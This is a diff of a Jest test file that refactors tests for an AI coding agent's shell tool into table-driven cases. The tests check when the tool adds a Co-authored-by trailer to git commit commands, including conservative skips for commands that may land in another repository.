+          'npm install',
           expect.stringContaining('npm install'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      it('should not modify git commands without -m flag', async () => {
-        const command = 'git commit';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
+        ],
+        [
+          'should not modify git commands without -m flag',
+          'git commit',
           expect.stringContaining('git commit'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
+        ],
+        ...rowsOf(NO_TRAILER, {
+          // `cd /elsewhere && git commit` may commit into another repo; without
+          // resolving the target we can't snapshot pre-HEAD or write notes
+          // there, so the rewrite is skipped.
+          'should NOT add co-author when git commit is preceded by cd':
+            'cd /tmp/test && git commit -m "Test commit"',
+          // Embedded `..` (`cd foo/../../escape`) escapes like a leading `..`;
+          // accepting it would trailer a commit landing in another repo.
+          'should NOT add co-author for cd with embedded .. (escapes via traversal)':
+            'cd foo/../../escape && git commit -m "Test"',
+          // `cd ..` could escape the repo root: conservative shift.
+          'should NOT add co-author for cd .. && git commit (could escape repo)':
+            'cd .. && git commit -m "Test commit"',
+          // `cd $HOME` lands wherever $HOME points. Default `shell-quote`
+          // collapses `$HOME` to '' and the `target.includes('$')` check
+          // silently fails; the env-preserving parse keeps `$NAME` literal.
+          'should NOT add co-author for cd $HOME && git commit (env-var target)':
+            'cd $HOME && git commit -m "elsewhere"',
+          'should NOT add co-author for cd $REPO_ROOT && git commit (env-var target)':
+            'cd $REPO_ROOT && git commit -m "elsewhere"',
+          // `git -C <path> commit` runs in <path>: same risk as cd. Also the
+          // attached `-C/path` token and `--git-dir=` / `--work-tree=` forms.
+          'should NOT add co-author for git -C /tmp/other commit':
+            'git -C /tmp/other commit -m "Other"',
+          'should NOT add co-author for git -C/tmp/other commit (attached)':
+            'git -C/tmp/other commit -m "Other"',
+          'should NOT add co-author for git --git-dir=/tmp/other/.git commit':
+            'git --git-dir=/tmp/other/.git commit -m "Other"',
+          'should NOT add co-author for git --work-tree=/tmp/other commit':
+            'git --work-tree=/tmp/other commit -m "Other"',
+          // `shell-quote` parses an unresolved env-var or substitution as '',
+          // indistinguishable from `-C ""`; treating it as a no-op would
+          // trailer `git -C $HOME commit` in another repo. Skipping beats the
+          // rare `-C $PWD` miss.
+          'should NOT add co-author for git -C $HOME commit (env-var/empty target)':
+            'git -C $HOME commit -m "elsewhere"',
+          'should NOT add co-author for git -C "" commit (env-var/empty target)':
+            'git -C "" commit -m "literal empty"',
+          // Quoted "git commit" should not look like an executed commit.
+          'should NOT add co-author when git commit appears only inside quoted text':
+            'echo "git commit -m foo"',
+        }),
+        ...rowsOf(TRAILER, {
+          // `cd subdir && git commit` stays in the repo and is common; the old
+          // blanket "any cd shifts cwd" gate broke it. Only absolute, `..`,
+          // env-var etc. targets count as shifted.
+          'should add co-author for cd subdir && git commit (relative same-repo)':
+            'cd src && git commit -m "Test commit"',
+          // `env` is a wrapper like `sudo`/`command` that also takes
+          // `KEY=VALUE` argv entries; unhandled, the regex took `KEY=VALUE`
+          // as the program.
+          'should add co-author when git commit is wrapped in env KEY=VAL':
+            'env GIT_COMMITTER_DATE=now git commit -m "Test commit"',
+          // `env -u NAME` takes a value that tokeniseSegment must skip, or NAME
+          // masks the real `git commit` as the program.
+          'should add co-author when git commit is wrapped in env -u NAME':
+            'env -u GIT_AUTHOR_DATE git commit -m "Test commit"',
+          // A cd AFTER an in-cwd commit doesn't matter: the commit already
+          // landed.
+          'should add co-author when cd comes AFTER git commit':
+            'git commit -m "Test" && cd /tmp/test',
+          // Global flags (`-c`, `--no-pager`) push the subcommand past index
+          // 1; a fixed arg1 check used to silently skip these.
+          'should add co-author for git -c key=val commit':
+            'git -c user.email=x@y commit -m "Test"',
+          'should add co-author for git --no-pager commit':
+            'git --no-pager commit -m "Test"',
+          // Common real-world prefixes (env assignment, `sudo`) must still
+          // attribute.
+          'should add co-author when git commit is prefixed with env vars':
+            'GIT_COMMITTER_DATE=now git commit -m "Test"',
+          'should add co-author when git commit is prefixed with sudo':
+            'sudo git commit -m "Test"',
+          // `sudo -u user git commit` puts the program at [3]; a flag-only
+          // consumer would leave `user` standing in for the program.
+          'should add co-author for sudo with value-taking flag (-u user)':
+            'sudo -u other git commit -m "Test"',
+          // `--message` is git's documented long alias for `-m`.
+          'should add co-author for git commit --message "..."':
+            'git commit --message "Test commit"',
+          'should add co-author for git commit --message="..."':
+            'git commit --message="Test commit"',
+        }),
+      ])('%s', async (_title, command, expected) => {
+        await spawnedCommand(command);
+        expectSpawned(expected);
       });
 
-      it('should handle git commit with escaped quotes in message', async () => {
-        const command = 'git commit -m "Fix \\"quoted\\" text"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining(
-            'Co-authored-by: Qwen-Coder <qwen-coder@alibabacloud.com>',
-          ),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      it('should not add co-author when only pr is enabled (commit off)', async () => {
-        // Commit attribution must be independent from PR attribution:
-        // disabling commit should skip the Co-authored-by trailer even if
-        // pr remains enabled.
-        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
-          commit: false,
-          pr: true,
-          name: 'Qwen-Coder',
-          email: 'qwen-coder@alibabacloud.com',
-        });
-
-        const command = 'git commit -m "Initial commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.not.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      it('should not add co-author when disabled in config', async () => {
-        // Mock config with commit co-author disabled
-        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
-          commit: false,
-          pr: false,
-          name: 'Qwen-Coder',
-          email: 'qwen-coder@alibabacloud.com',
-        });
-
-        const command = 'git commit -m "Initial commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
+      it.each<[string, object, string, unknown]>([
+        // Commit attribution is independent of PR attribution: commit off
+        // skips the trailer even with pr on.
+        [
+          'should not add co-author when only pr is enabled (commit off)',
+          { commit: false, pr: true },
+          'git commit -m "Initial commit"',
+          NO_TRAILER,
+        ],
+        [
+          'should not add co-author when disabled in config',
+          { commit: false, pr: false },
+          'git commit -m "Initial commit"',
           expect.stringContaining('git commit -m "Initial commit"'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      it('should use custom name and email from config', async () => {
-        // Mock config with custom co-author details
-        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
-          commit: true,
-          pr: true,
-          name: 'Custom Bot',
-          email: 'custom@example.com',
-        });
-
-        const command = 'git commit -m "Test commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
+        ],
+        [
+          'should use custom name and email from config',
+          {
+            commit: true,
+            pr: true,
+            name: 'Custom Bot',
+            email: 'custom@example.com',
+          },
+          'git commit -m "Test commit"',
           expect.stringContaining(
             'Co-authored-by: Custom Bot <custom@example.com>',
           ),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // `cd /elsewhere && git commit` could be redirecting the commit
-      // into a different repo than our cwd. We can't take a meaningful
-      // pre-HEAD snapshot or write notes to the right place without
-      // resolving the cd target, so we conservatively skip the
-      // co-author rewrite altogether.
-      it('should NOT add co-author when git commit is preceded by cd', async () => {
-        const command = 'cd /tmp/test && git commit -m "Test commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
+        ],
+      ])('%s', async (_title, coAuthor, command, expected) => {
+        (mockConfig.getGitCoAuthor as Mock).mockReturnValue({
+          name: 'Qwen-Coder',
+          email: 'qwen-coder@alibabacloud.com',
+          ...coAuthor,
         });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.not.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
+        await spawnedCommand(command);
+        expectSpawned(expected);
       });
 
-      // `cd subdir && git commit` (relative cd that doesn't escape
-      // upward) is a very common workflow — entering a subdirectory
-      // before committing. The cd target stays inside the same repo,
-      // so attribution should still apply. The earlier blanket
-      // "any cd shifts cwd" gate broke this; the heuristic now only
-      // marks shifted on absolute paths, `..`-prefixed paths, env-var
-      // expansions, etc.
-      it('should add co-author for cd subdir && git commit (relative same-repo)', async () => {
-        const command = 'cd src && git commit -m "Test commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // `cd ..` could escape the repo root — conservative shift.
-      // Embedded `..` traversal — `cd foo/../../escape` — could
-      // escape the repo just as much as a leading `..`, so the
-      // heuristic must reject it. Without this the trailer would
-      // be appended to a commit landing in a different repo.
-      it('should NOT add co-author for cd with embedded .. (escapes via traversal)', async () => {
-        const command = 'cd foo/../../escape && git commit -m "Test"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.not.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // `env` is a shell wrapper like `sudo`/`command`, with the
-      // additional twist that it accepts `KEY=VALUE` argv entries
-      // before the program. Without explicit handling, the regex
-      // would see `KEY=VALUE` as the program name and skip
-      // attribution entirely.
-      it('should add co-author when git commit is wrapped in env KEY=VAL', async () => {
-        const command =
-          'env GIT_COMMITTER_DATE=now git commit -m "Test commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // `env -u NAME` unsets a variable. The flag takes a value, so
-      // tokeniseSegment has to skip it; otherwise NAME would be left
-      // as the next token and the parser would treat it as the
-      // program, masking the real `git commit`.
-      it('should add co-author when git commit is wrapped in env -u NAME', async () => {
-        const command = 'env -u GIT_AUTHOR_DATE git commit -m "Test commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // `GIT_DIR=...` and friends redirect git's repo selection; a
-      // commit prefixed with one of these lands in a different repo
-      // than our cwd. Stamping the trailer onto it would corrupt a
-      // commit in a repo the user didn't expect us to touch.
+      // `GIT_DIR=...` and friends redirect git to another repo; trailering
+      // that commit would corrupt a repo the user didn't expect us to touch.
       it.each([
         ['GIT_DIR', 'GIT_DIR=/tmp/other/.git git commit -m "msg"'],
         ['GIT_WORK_TREE', 'GIT_WORK_TREE=/tmp/other git commit -m "msg"'],
@@ -5586,17 +3763,13 @@ describe('ShellTool', () => {
           'env-wrapped GIT_DIR',
           'env GIT_DIR=/tmp/other/.git git commit -m "msg"',
         ],
-        // GNU coreutils 8.30+'s `env -C DIR` / `--chdir` relocates
-        // the working directory before exec — same repo-shifting
-        // contract as `cd /elsewhere && git commit`.
+        // GNU coreutils 8.30+ `env -C DIR` / `--chdir` relocates cwd before
+        // exec, the same contract as `cd /elsewhere && git commit`.
         ['env -C', 'env -C /tmp/other git commit -m "msg"'],
         ['env --chdir', 'env --chdir /tmp/other git commit -m "msg"'],
-        // Attached-value forms: `shell-quote` tokenises `--chdir=/tmp`
-        // and `-C/tmp` as single argv entries, so the bare-flag set
-        // membership check would miss them. Without explicit
-        // attached-form handling, `sudo --chdir=/tmp git commit` and
-        // `env -C/tmp git commit` would silently land our trailer on
-        // a commit in the wrong repo.
+        // `shell-quote` keeps `--chdir=/tmp` and `-C/tmp` as single tokens,
+        // which a bare-flag membership check misses, trailering `sudo
+        // --chdir=/tmp git commit` / `env -C/tmp git commit` in the wrong repo.
         ['env --chdir=', 'env --chdir=/tmp/other git commit -m "msg"'],
         ['env -C attached', 'env -C/tmp/other git commit -m "msg"'],
         ['sudo --chdir=', 'sudo --chdir=/tmp/other git commit -m "msg"'],
@@ -5604,290 +3777,40 @@ describe('ShellTool', () => {
       ])(
         'should NOT add co-author for repo-redirecting %s assignment',
         async (_label, command) => {
-          const invocation = shellTool.build({ command, is_background: false });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveExecutionPromise({
-            rawOutput: Buffer.from(''),
-            output: '',
-            exitCode: 0,
-            signal: null,
-            error: null,
-            aborted: false,
-            pid: 12345,
-            executionMethod: 'child_process',
-          });
-          await promise;
-          const observed = mockShellExecutionService.mock.calls[0][0];
-          expect(observed).not.toContain('Co-authored-by:');
-        },
-      );
-
-      // GIT_AUTHOR_DATE / GIT_COMMITTER_DATE / etc. tweak commit
-      // metadata but don't relocate the repo — attribution still
-      // applies as normal.
-      it('should still add co-author with benign GIT_COMMITTER_DATE assignment', async () => {
-        const command =
-          'GIT_COMMITTER_DATE="2026-01-01T00:00:00Z" git commit -m "Test commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
-        const observed = mockShellExecutionService.mock.calls[0][0];
-        expect(observed).toContain('Co-authored-by:');
-      });
-
-      it('should NOT add co-author for cd .. && git commit (could escape repo)', async () => {
-        const command = 'cd .. && git commit -m "Test commit"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.not.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // `cd $HOME && git commit` would land in whatever repo `$HOME`
-      // points to — typically NOT our cwd. With the default
-      // `shell-quote` parse, `$HOME` collapses to `''` and the
-      // `target.includes('$')` repo-shift check silently fails. The
-      // env-preserving parse keeps `$NAME` literal in tokens so this
-      // case is correctly flagged.
-      it.each([
-        ['$HOME', 'cd $HOME && git commit -m "elsewhere"'],
-        ['$REPO_ROOT', 'cd $REPO_ROOT && git commit -m "elsewhere"'],
-      ])(
-        'should NOT add co-author for cd %s && git commit (env-var target)',
-        async (_label, command) => {
-          const invocation = shellTool.build({
-            command,
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveExecutionPromise({
-            rawOutput: Buffer.from(''),
-            output: '',
-            exitCode: 0,
-            signal: null,
-            error: null,
-            aborted: false,
-            pid: 12345,
-            executionMethod: 'child_process',
-          });
-          await promise;
-          expect(mockShellExecutionService).toHaveBeenCalledWith(
-            expect.not.stringContaining('Co-authored-by:'),
-            expect.any(String),
-            expect.any(Function),
-            expect.any(AbortSignal),
-            false,
-            expect.objectContaining({}),
-            expect.objectContaining({ postPromote: expect.any(Object) }),
+          expect(await spawnedCommand(command)).not.toContain(
+            'Co-authored-by:',
           );
         },
       );
 
-      // A cd that comes AFTER an in-cwd commit doesn't invalidate the
-      // commit's attribution — the commit already landed in our repo.
-      it('should add co-author when cd comes AFTER git commit', async () => {
-        const command = 'git commit -m "Test" && cd /tmp/test';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
+      // GIT_AUTHOR_DATE / GIT_COMMITTER_DATE etc. tweak metadata without
+      // relocating the repo, so attribution still applies.
+      it('should still add co-author with benign GIT_COMMITTER_DATE assignment', async () => {
+        expect(
+          await spawnedCommand(
+            'GIT_COMMITTER_DATE="2026-01-01T00:00:00Z" git commit -m "Test commit"',
+          ),
+        ).toContain('Co-authored-by:');
       });
 
-      // `git -C <path> commit` runs in <path>, not our cwd — same risk
-      // as the cd case, so the rewrite should be skipped. Also covers
-      // the attached-value form `-C/path` (single token from
-      // shell-quote) and the long-flag attached forms
-      // `--git-dir=/path` / `--work-tree=/path`.
-      it.each([
-        ['git -C /tmp/other commit', 'git -C /tmp/other commit -m "Other"'],
-        [
-          'git -C/tmp/other commit (attached)',
-          'git -C/tmp/other commit -m "Other"',
-        ],
-        [
-          'git --git-dir=/tmp/other/.git commit',
-          'git --git-dir=/tmp/other/.git commit -m "Other"',
-        ],
-        [
-          'git --work-tree=/tmp/other commit',
-          'git --work-tree=/tmp/other commit -m "Other"',
-        ],
-      ])('should NOT add co-author for %s', async (_label, command) => {
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.not.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // `git -C .` (or `-C ./` or `-C .` attached as `-C.`) is a
-      // semantic no-op — the cwd doesn't actually change. The
-      // previous "any -C → cwd-shifted" rule silently skipped
-      // attribution for what's basically `git commit` with an
-      // explicit cwd marker. Treat dot-form as in-cwd.
+      // `git -C .` / `-C ./` / `-C.` don't change cwd; the old "any -C shifts"
+      // rule silently skipped what is basically a plain `git commit`.
       it.each([
         ['git -C . commit', 'git -C . commit -m "in cwd"'],
         ['git -C ./ commit', 'git -C ./ commit -m "in cwd"'],
         ['git -C. commit (attached)', 'git -C. commit -m "in cwd"'],
       ])('should add co-author for %s', async (_label, command) => {
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-        await promise;
-        const observed = mockShellExecutionService.mock.calls[0][0];
-        expect(observed).toContain('Co-authored-by:');
+        expect(await spawnedCommand(command)).toContain('Co-authored-by:');
       });
 
-      // `shell-quote` parses an unresolved env-var (`$HOME`, `$REPO`)
-      // or unknown command-substitution as the empty string, which is
-      // indistinguishable from a literal `-C ""`. Treating that as
-      // no-op would let `git -C $HOME commit` silently land our trailer
-      // on a commit that goes to a different repo. Conservative skip is
-      // safer than the rare `-C $PWD` miss.
-      it.each([
-        ['git -C $HOME commit', 'git -C $HOME commit -m "elsewhere"'],
-        ['git -C "" commit', 'git -C "" commit -m "literal empty"'],
-      ])(
-        'should NOT add co-author for %s (env-var/empty target)',
-        async (_label, command) => {
-          const invocation = shellTool.build({
-            command,
-            is_background: false,
-          });
-          const promise = invocation.execute(mockAbortSignal);
-          resolveExecutionPromise({
-            rawOutput: Buffer.from(''),
-            output: '',
-            exitCode: 0,
-            signal: null,
-            error: null,
-            aborted: false,
-            pid: 12345,
-            executionMethod: 'child_process',
-          });
-          await promise;
-          expect(mockShellExecutionService).toHaveBeenCalledWith(
-            expect.not.stringContaining('Co-authored-by:'),
-            expect.any(String),
-            expect.any(Function),
-            expect.any(AbortSignal),
-            false,
-            expect.objectContaining({}),
-            expect.objectContaining({ postPromote: expect.any(Object) }),
-          );
-        },
-      );
-
-      // Trailing shell comments must not confuse the `-m` rewrite:
-      // `git commit -m "real" # -m "fake"` would otherwise have
-      // `lastMatchOf` pick the comment's `-m "fake"` and splice the
-      // trailer into a `-m` flag bash discards, leaving the actual
-      // commit unattributed. The unquoted-`#` truncation in the
-      // segment slicing keeps the rewrite scoped to the live part.
+      // In `git commit -m "real" # -m "fake"`, `lastMatchOf` would pick the
+      // comment's `-m`, a flag bash discards, leaving the commit unattributed;
+      // unquoted-`#` truncation keeps the rewrite on the live part.
       it('should add co-author for git commit followed by # comment', async () => {
-        const command = 'git commit -m "real" # -m "fake"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        const observed = mockShellExecutionService.mock.calls[0][0] as string;
-        // Trailer must land in the live `-m "real"` body, BEFORE the `#`.
+        const observed = await spawnedCommand(
+          'git commit -m "real" # -m "fake"',
+        );
+        // The trailer lands in the live `-m "real"` body, BEFORE the `#`.
         expect(observed).toContain('Co-authored-by:');
         const realIdx = observed.indexOf('-m "real');
         const hashIdx = observed.indexOf(' # ');
@@ -5898,187 +3821,22 @@ describe('ShellTool', () => {
         expect(coAuthorIdx).toBeLessThan(hashIdx);
       });
 
-      // A `#` inside a quoted commit body is NOT a comment marker.
-      // `git commit -m "fix #123"` should still get the trailer
-      // appended inside the quoted body.
+      // A `#` inside a quoted body is not a comment: `#123` must stay in the
+      // body with the trailer appended inside it.
       it('should add co-author for git commit -m with # inside body', async () => {
-        const command = 'git commit -m "fix #123 add feature"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-        const observed = mockShellExecutionService.mock.calls[0][0] as string;
-        expect(observed).toContain('Co-authored-by:');
-        // The `#123` MUST still be inside the body (not pushed out by
-        // the comment-truncation logic mistaking it for a comment).
-        expect(observed).toContain('#123');
-      });
-
-      // git's global flags (`-c`, `--no-pager`, etc.) push the
-      // subcommand past index 1; a fixed-position check at arg1 used
-      // to silently skip these forms. Make sure we still inject the
-      // trailer for them.
-      it('should add co-author for git -c key=val commit', async () => {
-        const command = 'git -c user.email=x@y commit -m "Test"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
+        const observed = await spawnedCommand(
+          'git commit -m "fix #123 add feature"',
         );
+        expectText(observed, ['Co-authored-by:', '#123']);
       });
 
-      it('should add co-author for git --no-pager commit', async () => {
-        const command = 'git --no-pager commit -m "Test"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // Common real-world prefixes — env-var assignment and `sudo` — must
-      // still be detected so attribution doesn't silently skip the trailer.
-      it('should add co-author when git commit is prefixed with env vars', async () => {
-        const command = 'GIT_COMMITTER_DATE=now git commit -m "Test"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
-        expect(mockShellExecutionService).toHaveBeenCalledWith(
-          expect.stringContaining('Co-authored-by:'),
-          expect.any(String),
-          expect.any(Function),
-          expect.any(AbortSignal),
-          false,
-          expect.objectContaining({}),
-
-          expect.objectContaining({ postPromote: expect.any(Object) }),
-        );
-      });
-
-      // `sudo -u user git commit` puts the program at index [3], not
-      // [1]; a naive flag-only consumer would leave `user` standing
-      // in for the program name.
-      it('should add co-author for sudo with value-taking flag (-u user)', async () => {
-        const command = 'sudo -u other git commit -m "Test"';
-        const invocation = shellTool.build({ command, is_background: false });
-        const promise = invocation.execute(mockAbortSignal);
-
-        resolveExecutionPromise({
-          rawOutput: Buffer.from(''),
-          output: '',
-          exitCode: 0,
-          signal: null,
-          error: null,
-          aborted: false,
-          pid: 12345,
-          executionMethod: 'child_process',
-        });
-
-        await promise;
-
